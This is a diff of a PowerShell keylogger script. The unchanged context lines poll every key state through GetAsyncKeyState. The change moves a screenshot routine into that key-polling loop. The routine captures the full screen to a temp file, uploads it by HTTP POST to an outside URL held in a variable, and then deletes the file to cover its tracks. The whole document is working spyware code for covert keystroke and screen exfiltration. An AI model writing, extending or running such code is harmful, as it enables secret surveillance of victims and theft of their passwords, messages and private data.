@@ -46,6 +46,27 @@ While ($true){
             Start-Sleep -Milliseconds 30
             for ($asc = 8; $asc -le 254; $asc++){
                 # Get the key state. (Is any key currently pressed)
+		$seconds = 30 # Screenshot interval
+		$a = 1 # Screenshot amount
+		While ($a -gt 0) {
+    		$Filett = "$env:temp\SC.png"
+    		Add-Type -AssemblyName System.Windows.Forms
+    		Add-type -AssemblyName System.Drawing
+    		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    		$Width = $Screen.Width
+    		$Height = $Screen.Height
+    		$Left = $Screen.Left
+   		$Top = $Screen.Top
+   		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    		Start-Sleep 1
+    		Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
+    		Start-Sleep 1
+    		Remove-Item -Path $Filett
+   		Start-Sleep $seconds
+  		 $a--
                 $keyst = $API::GetAsyncKeyState($asc)
                 # If a key is pressed
                 if ($keyst -eq -32767) {
@@ -89,27 +110,4 @@ While ($true){
     # Reset the stopwatch before restarting the loop
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
-
-$seconds = 30 # Screenshot interval
-$a = 1 # Screenshot amount
-
-While ($a -gt 0) {
-    $Filett = "$env:temp\SC.png"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-    Start-Sleep 1
-    Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
-    Start-Sleep 1
-    Remove-Item -Path $Filett
-    Start-Sleep $seconds
-    $a--
 }
